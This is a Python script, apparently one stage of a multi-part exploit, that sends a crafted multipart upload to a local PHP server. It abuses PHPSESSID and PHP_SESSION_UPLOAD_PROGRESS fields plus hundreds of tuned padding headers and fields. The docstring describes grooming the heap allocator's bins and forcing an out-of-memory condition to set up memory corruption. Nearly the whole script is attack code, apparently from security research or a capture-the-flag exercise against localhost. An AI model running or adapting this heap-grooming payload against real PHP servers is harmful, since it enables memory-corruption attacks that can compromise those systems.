#!/usr/bin/env python3
"""A reordered: PHPSESSID, progress, FILE PART, then the 997 padding fields.
The session id is allocated at FILE_START before the padding fields, so the
32B bin still has the low page 0x1 with slot13 free (matching B's forge raw).
The padding fields after the file part still fill memory for the END OOM.
usage: send_a_id2.py N128 V NH HL NS N64E [PATH]
"""
import socket,sys
N128=int(sys.argv[1]); V=int(sys.argv[2]); NH=int(sys.argv[3]); HL=int(sys.argv[4]); NS=int(sys.argv[5]); N64E=int(sys.argv[6]); PATH=sys.argv[7] if len(sys.argv)>7 else '/plain.php'
N=997
BND=b'S'*17
parts=[{'name':'PHPSESSID','data':b'\x00'},{'name':'PHP_SESSION_UPLOAD_PROGRESS','data':b'pwn'}]
head=b'Content-Disposition: form-data; name="f"; filename="a.txt"\r\n'
for i in range(NH):
    head += b'X-Pad-%04d: '%i + b'H'*HL + b'\r\n'
for i in range(NS):
    head += b'X-Sml-%04d: '%i + b's'*15 + b'\r\n'
head += b'Content-Type: application/octet-stream\r\n\r\n'
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['name'].encode()+b'"\r\n\r\n'+p['data']+b'\r\n'
o+=b'--'+BND+b'\r\n'+head+b'A'*64+b'\r\n'
for i in range(N):
    if i<N64E:
        val=b'q'*39
    else:
        ln=103 if i<N128 else V
        val=(b'A'*ln)
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="f%04d"\r\n\r\n'%i+val+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST {PATH} HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
try: s.sendall(h+bytes(o))
except OSError: pass
try:
    while s.recv(65536): pass
except OSError: pass
s.close()
